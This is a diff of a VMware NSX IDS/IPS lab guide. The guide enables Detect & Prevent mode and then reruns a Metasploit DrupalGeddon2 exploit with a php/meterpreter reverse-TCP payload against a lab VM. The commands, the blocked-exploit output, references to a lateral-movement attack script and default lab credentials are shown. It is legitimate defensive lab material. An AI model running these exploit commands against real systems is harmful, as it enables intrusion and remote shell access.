@@ -36,97 +36,84 @@ Now we will also set the action for signatures related to **CouchDB** in the **D
 6. Click the **ACTION** button on top and choose **Drop** to change the action for all selected signatures to **Drop**. Click **Apply** to confirm.
 7. Click **SAVE** to save the changes to the **Databases** profile.
 
-**Change the IDS/IPS Mode to Detect and Prevent**
+**Change the IDS/IPS Mode to Detect & Prevent**
+
+For each IDS/IPS Rule, you can set the mode to **Detect Only** or **Detect & Prevent**. This mode effecively limits the action that can be taken. When deployed in **Detect Only** mode, the only action that will be taken when a signature is triggerd is an **Alert** will be generated, regardless of the action set for the signature. In **Detect & Prevent** mode on the other hand, the action set on each signature is applied.
 
 1. In the NSX Manager UI, navigate to Security -->  Distributed IDS/IPS --> Rules
-2. Click **ADD POLICY**
-3. Create an IDS Policy named **NSX IDPS Evaluation** .
-4. Check the checkbox for the policy you just created and click **ADD RULE**.
-5. Add an IDS Rule with the following parameters
-    * Name **Web-Tier Policy**
-    * IDS Profile **Web-FrontEnd**
-    * Applied to **Web-Tier** (group)
-	* Mode **Detect Only**
-    * Leave other settings to defaults
-6. Add another IDS Rule with the following parameters
-    * Name **App-Tier Policy**
-    * IDS Profile **Databases**
-    * Applied to **App-Tier** (group)
-		* Mode **Detect Only**
-    * Leave other settings to defaults
-7. Click **Publish**
+2. Click the **>** icon to expand the **NSX IDPS Evaluation** Policy. **ADD POLICY**
+3. For both the **App-Tier Policy** and **Web-Tier Policy** rule, change the mode from **Detect Only** to **Detect & Prevent**.
 
-![](assets/images/IDPS_POC_50.PNG)
+![](assets/images/IDPS_POC_57.PNG)
 
+4. Click **PUBLISH** to commit the changes.
 
-Now we will also set the action for signatures related to **CouchDB** in the **Databases** profile to **Drop**.
+**Open a SSH/Console session to the External VM**
+1.	If your computer has access to the IP address you've assigend to the **External VM** (10.114.209.151 in my example), open your ssh client and initiate a session to it. Login with the below credentials. 
+    * Username **vmware**
+    * Password **VMware1!**
+2. **Alternatively**, if your computer does not have access to the **External VM** directly, you can access the VM console from the  physical environment vCenter Web-UI. 
 
-1. In t
-
-
-3.	Create a Profile with the below parameters. Click Save when done.
-    * Name **Web-FrontEnd**
-    * Signatures to Include: **Attack Targets**: **Web Server**
-	
-![](assets/images/IDPS_POC_47.PNG)
-
-3.	Create another Profile with the below parameters. Click Save when done.
-    * Name **Databases**
-    * Signatures to Include: **Products Affected**: **apache couchdb**
-
-![](assets/images/IDPS_POC_48.PNG)
-![](assets/images/IDPS_POC_49.PNG)
-
-
-
-**Enable IDS/IPS event logging directly from each host to a syslog collector/SIEM**
-
-> **Note**: In addition to sending IDS/IPS Events from each distributed IDS/IPS engine, you can send them directly to a Syslog collector or SIEM from each host. Events are sent in the EVE.JSON format for which many SIEMS have pre-existing parsers/dashboards. 
-
-In this exercise, you will learn how to conigure IDS event export from each host to your syslog collector or SIEM of choice. I will use **vRealize Log Insight**. You can use the same or your own SIEM of choice.
-We will not cover how to install **vRealize Log Insight** or any other logging platform, but the following steps will cover how to send IDS/IPS evens to an aleady configured collector.
-
-1. Login to lab vCenter and click on **Hosts and Clusters**, then select one of the 3 hosts that were deployed.
-2. Click the **Configure** Tab and Scroll down to **System**. Click **Advanced System Settings**
-3. Click the **Edit** button
-4. In the **Filter** field, type **loghost**
-5. Enter the **IP address of your syslog server** in the **Syslog.global.logHost** value field and click **OK** to confirm.
-![](assets/images/IDPS_POC_23.PNG)
-6. Repeat the same for the remaining 2 hosts.
-7. Click on **Firewall** in the same **System** menu
-8. Click the **Edit** button
-9. In the **Filter** field, type **syslog**
-10. Tick the checkbox next to **syslog** to allow outbuound syslog from the host.
-11. Repeat the same for the remaining 2 hosts.
-![](assets/images/IDPS_POC_24.PNG)
-12. Open a terminal session to one of the lab hypervisors , login with **root**/**VMware1!** and execute the below commands to enable IDS log export via syslog
-    * Type **nsxcli** to enter the NSX CLI on the host
-    * Type **set ids engine syslogstatus enable** to enable syslog event export
-    * Confirm syslog event export was succesfully enabled by running the command **get ids engine syslogstatus**
+**Initiate DrupalGeddon2 attack against the App1-WEB-TIER VM (again)**
+1.	Type **sudo msfconsole** to launch **Metasploit**. Enter **VMware1!** if prompted for a password. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
+    * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
+    * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
+    * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
+    * Type **exploit** to initiate the exploit, esbalish a reverse shell
+    
+2.	Confirm that as a **detect & prevent** policy is applied to the WEB-TIER VMs, the exploit attempt was prevented and no meterpreter session was established. Because the initial exploit was not successful, lateral movement to the iternal segment is also prevented.
 
 ```console
-[root@localhost:~] nsxcli
-localhost> set ids engine syslogstatus enable
-    result: success
-    
-localhost> get ids engine syslogstatus
-       NSX IDS Engine Syslog Status Setting
---------------------------------------------------
-                       true
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/unix/webapp/drupal_drupalgeddon2
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOST 192.168.10.101
+RHOST => 192.168.10.101
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 8080
+RPORT => 8080
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
+
+[*] Started reverse TCP handler on 10.114.209.151:4444
+[*] Exploit completed, but no session was created.
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) >
+
 ```
-13. Login to your syslog collector/SIEM and confirm you are receiving logs form each host.
-14. Configure a parser or a filter to only look at IDS events. You can for example filter on the string **IDPS_EVT**. 
-![](assets/images/IDPS_POC_25.PNG)
-15. Now we will run the lateral attack scenario we used in an earlier exercise again. This time, use the pre-defined script to run the attack instead of manaully cofiguring the **Metasploit modules**.
-16. Before you execute the script, if you have not previously used it, you need to ensure the IP addresses match your environment.  Utype **sudo nano attack2.rc** and replace the **RHOST** and **LHOST** IP addresses accordingly to match with the IP addresses in your environment. 
-    * **RHOST** on line 3 should be the IP address of the App1-WEB-TIER VM 
-    * **SUBNET** on line 6 (route add) should be the Internal Network subnet 
-    * **LHOST** on line 9 should be the IP address of the External VM (this local machine) 
-    * **RHOST** on line 10 should be the IP address of the App1-APP-TIER VM RHOST on line 13 should be the IP address of the App2-APP-TIER VM
-17. After saving your changes, run the attack2 script by executing **sudo ./attack2.sh**.
-18. Confirm a total of 3 meterpreter/command shell sessions have been established
-19. Confirm your syslog server/SIEM has received the IDS events, directly from the host
-![](assets/images/IDPS_POC_26.PNG)
+**Confirm IDS/IPS Events show up in the NSX Manager UI**
+1.	In the NSX Manager UI, navigate to Security -->  Security Overview
+2. Under the **Insights** tab, confirm you see a number of attempted intrusion against the  **APP-1-WEB-TIER** workload
+![](assets/images/IDPS_POC_53.PNG)
+3. Navigate to Security --> East West Security --> Distributed IDS
+4. Confirm 3 signatures have fired:
+    * Signature for **DrupalGeddon2**, with **APP-1-WEB-TIER** as Affected VM
+    * Signature for **Remote Code execution via a PHP script**, with **APP-1-WEB-TIER** as Affected VM
+    * Signature for **Apache CouchDB Remote Privilege Escalation**, with **APP-1-WEB-TIER**, **APP-1-APP-TIER**, **APP-2-APP-TIER** as Affected VMs
+    
+    ![](assets/images/IDPS_POC_54.PNG)
+
+> **Note**: Events are ordered based on the time a particular signature last fired. The last event is at the top of the table.
+
+5. Now you can drill down into these events. Click the **>** symbol to the left of the **ET WEB_SPECIFIC_APPS [PT OPEN] Drupalgeddon2 <8.3.9 <8.4.6 <8.5.1 RCE Through Registration Form (CVE-2018-7600)** event near the bottom of the table to expand this event. 
+    * Confirm that the IP addresses of the attacker and victim match with the **External VM** and **APP-1-WEB-TIER VM** respectlively.
+    * click the **purple bar (Detected Only)** to see details about the exploit attempts. You may see multiple attemts (from different ports) as Metasploit initiated multiple connections
+    * this event contains vulnerability details including the **CVSS score** and **CVE ID**. Click the **2018-7600** CVE link to open up the **Mitre** CVE page and learn more about the vulnerability.
+6. **Optionally**, you can check the  obove details as well for the secondary event (except for the vulnerability details, which are not applicable to this more general signature)
+7. Now we can look at the **CouchDB** exploit, which we used to move laterally from **APP-1-WEB-TIER** to **APP-1-APP-TIER** and from **APP-1-APP-TIER**  to **APP-2-APP-TIER**. 
+8. Click the **>** symbol to the left of the **SLR Alert - Apache CouchDB Remote Privilege Escalation (CVE-2017-12635)** event
+    * Confirm that the IP addresses of the attacker and victim match with the **APP-1-APP-TIER VM** and **APP-2-APP-TIER VM** respectlively. This represents the last time this particular signature fired. 
+    * click the **purple bar (Detected Only)** to see details about the exploit attempts. You should be able to conirm that first this exploit was used to move the attack from **APP-1-WEB-TIER (192.168.10.101)** to **APP-1-APP-TIER (192.168.20.101) ** and then from **APP-1-APP-TIER**  to **APP-2-APP-TIER (192.168.20.100)**. 
+  
+![](assets/images/IDPS_POC_55.PNG)
+
+> **Note**: You will see 2 log entries for the intrusion against the APP-2-APP-TIER VM (192.168.20.100) because the attempt was detected at both source (APP-1-APP-TIER) VM and destination (APP-2-APP-TIER) VM.
+
+9. Click the **>** symbol to the left of the **ET WEB_SPECIFIC_APPS Apache CouchDB Remote Code Execution 1** event. Conirm the instrusion history matches the one of the event you previously looked at. 
+10. Now you can apply a wide array of filter criteria in order to only look at specific events. Use the checkboxes and filter to zoom in to specifc events:
+     * Only look at **Critical Severity** level events. There should only be one.
+     * Only look at events related to the the **APP-1-APP-TIER** VM. There should be one.
+     * Only look at events with a **CVSS Score** of **9 and above**. There should be 2.
+     * Only look at events where the **affected product** is **apache_couchdb**. There should be 1.
+
+You have now successfully completed a lateral attack scenario in detect-only mode ! 
+In the next  exercise, we will prevent the exploit by enabling detect and prevent mode.
 
 This completes this exercise. Before moving to the next exercise, folow [these instructions](/docs/ClearingIDSEvents.md) to clear the IDS events from NSX Manager
 
